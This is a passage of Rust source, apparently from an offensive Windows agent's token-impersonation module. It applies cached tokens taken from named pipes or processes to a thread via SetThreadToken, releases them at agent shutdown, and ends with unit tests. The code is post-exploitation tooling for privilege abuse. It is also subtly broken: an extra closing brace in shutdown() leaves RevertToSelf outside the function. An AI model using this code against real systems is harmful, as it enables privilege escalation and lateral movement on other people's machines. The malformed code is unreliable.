                .ok_or_else(|| anyhow!("no tokens in cache"))?
        };

        (token.handle, token.user.clone(), token.domain.clone())
    }; // guard dropped

    // Apply via SetThreadToken (more commonly available than NtSetInformationThread).
    let ok = unsafe { SetThreadToken(std::ptr::null_mut(), handle) };
    if ok == 0 {
        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
        return Err(anyhow!("SetThreadToken failed: Win32 error {err}"));
    }

    log::debug!("token_impersonation: applied cached token for {domain}\\{user}");
    Ok(())
}

/// Release all cached tokens, closing handles and clearing the cache.
/// Called during agent shutdown.  `CachedToken::Drop` closes each handle.
pub fn shutdown() {
    let mut guard = cache_mut();
    if let Some(ref mut cache) = *guard {
        // drain() drops each CachedToken, which closes the handle via Drop.
        // No need to call nt_close_handle explicitly — the Drop impl handles it.
        cache.drain();
    }
    }

    // Revert any active impersonation.
    unsafe { RevertToSelf() };

    log::info!("token_impersonation: shutdown complete, all tokens released");
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn config_defaults() {
        let cfg = common::config::TokenImpersonationConfig::default();
        assert!(cfg.enabled);
        assert!(cfg.prefer_set_thread_token);
        assert!(cfg.cache_tokens);
        assert!(cfg.auto_revert_on_task_complete);
    }

    #[test]
    fn token_source_hash_eq() {
        let s1 = TokenSource::Pipe(r"\\.\pipe\test".to_string());
        let s2 = TokenSource::Pipe(r"\\.\pipe\test".to_string());
        assert_eq!(s1, s2);

        let s3 = TokenSource::Process(1234);
        let s4 = TokenSource::Process(1234);
        assert_eq!(s3, s4);

        assert_ne!(s1, s3);
    }
}
